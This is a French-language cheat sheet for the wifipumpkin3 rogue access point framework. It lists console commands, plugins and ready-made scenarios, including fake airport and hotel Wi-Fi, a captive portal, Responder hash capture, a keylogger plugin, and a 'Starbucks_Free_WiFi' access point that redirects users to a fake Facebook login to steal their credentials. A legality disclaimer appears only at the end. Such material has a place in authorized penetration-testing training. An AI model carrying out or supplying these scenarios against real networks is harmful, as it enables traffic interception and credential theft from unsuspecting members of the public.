# 🍃 WIFIPUMPKIN3 - GUIDE COMPLET

## 🎯 DESCRIPTION
`wifipumpkin3` est un framework puissant pour créer de faux points d'accès (Rogue AP) à des fins de tests d'intrusion. Il permet de monter des attaques de type Man-in-the-Middle (MitM), de capturer du trafic, de lancer des attaques de phishing, etc.

## 🚀 LANCEMENT
L'outil s'exécute en ligne de commande avec une console interactive.
```bash
# Lancement standard
sudo wifipumpkin3

# Lancement de l'interface graphique (Pulp)
sudo wifipumpkin3 --xpulp
```

## 📋 COMMANDES PRINCIPALES DE LA CONSOLE
- `ap`: Affiche les options du point d'accès.
- `set <OPTION> <VALEUR>`: Configure une option (ex: `set ssid "Free WiFi"`).
- `start`: Démarre le point d'accès.
- `stop`: Arrête le point d'accès.
- `plugins`: Liste les plugins disponibles.
- `use <PLUGIN>`: Active un plugin (ex: `use phishing`).
- `clients`: Affiche les clients connectés.
- `logs`: Affiche les logs.

## 🌐 CONFIGURATION DU POINT D'ACCÈS (AP)
```bash
# Définir le nom du réseau Wi-Fi
set ssid "NomDuReseau"

# Définir le canal Wi-Fi (1-13)
set channel 6

# Définir l'interface réseau à utiliser
set interface wlan0
```

## 🎣 PLUGINS DE CAPTURE
Les plugins sont le cœur des attaques de `wifipumpkin3`.
- `use phishing`: Active le module de phishing.
  - `set template facebook`: Sélectionne un template de page de phishing.
- `use captiveportal`: Met en place un portail captif.
- `use responder`: Lance Responder pour capturer des hashes NTLMv2.
- `use keylogger`: Tente d'enregistrer les frappes clavier.

## 🎯 SCÉNARIOS D'USAGE

### 1. Créer un Faux Point d'Accès Ouvert
```bash
> set ssid "WiFi-Gratuit-Aeroport"
> set interface wlan0
> start
```
*Les clients qui se connectent verront leur trafic passer par votre machine.*

### 2. Attaque par Portail Captif
Force les utilisateurs à passer par une page (ex: fausse page d'acceptation des conditions) avant d'accéder à internet.
```bash
> set ssid "Hotel-WiFi-Guest"
> use captiveportal
> start
```

### 3. Attaque de Phishing
Crée un faux point d'accès et redirige les utilisateurs vers une fausse page de connexion pour voler leurs identifiants.
```bash
> set ssid "Starbucks_Free_WiFi"
> use phishing
> set template facebook
> start
```
*Quand un utilisateur essaiera de se connecter à Facebook, il sera redirigé vers votre fausse page.*

## 🔧 DÉPANNAGE
- **Interface "busy"**: `sudo airmon-ng check kill` peut aider à libérer l'interface Wi-Fi.
- **Problèmes de droits**: Assurez-vous de toujours lancer l'outil avec `sudo`.
- **Réinitialiser la configuration**: Supprimez `~/.config/wifipumpkin3/config/app/config.ini` et relancez l'outil.

---
> ⚠️ **LÉGALITÉ ET ÉTHIQUE**
> La création de faux points d'accès et l'interception de trafic sans autorisation sont illégales. N'utilisez cet outil que dans un cadre légal, sur votre propre matériel, ou avec une autorisation écrite explicite.
